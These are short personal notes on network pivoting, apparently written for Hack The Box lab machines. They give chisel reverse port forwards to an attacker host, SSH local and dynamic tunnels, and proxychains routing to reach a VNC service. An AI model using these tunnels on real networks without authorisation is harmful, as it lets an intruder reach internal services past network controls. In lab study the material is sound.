```
./chisel server --reverse -p PORT ##to create a server 
 client 
client <ATTACKER_IP>:9001 R:8500:127.0.0.1:8500 ##create client
 .\chisel.exe client 10.10.17.185:9002 R:8888:localhost:8888
```



# ssh reverse tunnel
```bash
ssh -L my_port:service_IP:target_port 	ssh target ip


ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@poison.htbb

-L # listening ports on our machine access  5801 and 5901
-D # Dynamic through proxy

```

# Proxy chains
First we add our local host and wanted port into /etc/proxychains.conf
```bash
socks4 127.0.0.1 8081
```
Then we can use ssh to tunnel though port 8081
```bash
ssh charix@10.10.10.84 -D 8081
```

then we can use proxychains with what ever command we want using the wanted port
```bash
proxychains vncviewer 127.0.0.1:5901 -passwd secret
```